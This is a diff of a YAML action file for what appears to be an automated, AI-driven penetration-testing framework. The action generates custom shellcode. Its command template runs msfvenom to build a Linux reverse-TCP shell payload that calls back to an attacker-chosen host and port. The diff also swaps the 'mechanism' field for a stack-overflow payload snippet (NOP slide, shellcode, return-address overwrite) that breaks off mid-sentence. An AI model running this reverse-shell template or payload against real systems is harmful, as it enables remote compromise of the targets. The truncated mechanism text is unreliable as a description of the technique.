@@ -2,15 +2,20 @@ name: shellcode
 category: binary
 description: Custom shellcode generation
 preconditions:
-  - has_target
+- has_target
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\x00'"
+command_template: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport}\
+  \ -f python -b '\0'"
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Generate shellcode avoiding bad characters. pwntools: shellcraft.sh() for /bin/sh, shellcraft.connect() for reverse shell. Encode to bypass filters."
+mechanism: 'nop_slide = asm(''nop'') * (offset - len(shellcode)) payload = nop_slide
+  + shellcode payload += b''A'' * (offset - len(payload))  # Adjust the payload size
+  to exactly fill the buffer and overwrite EIP payload += p32(0xffffcfb4) # Supossing
+  0xffffcfb4 wil'
+hacktricks_ref: binary-exploitation/stack-overflow/stack-shellcode/README.md
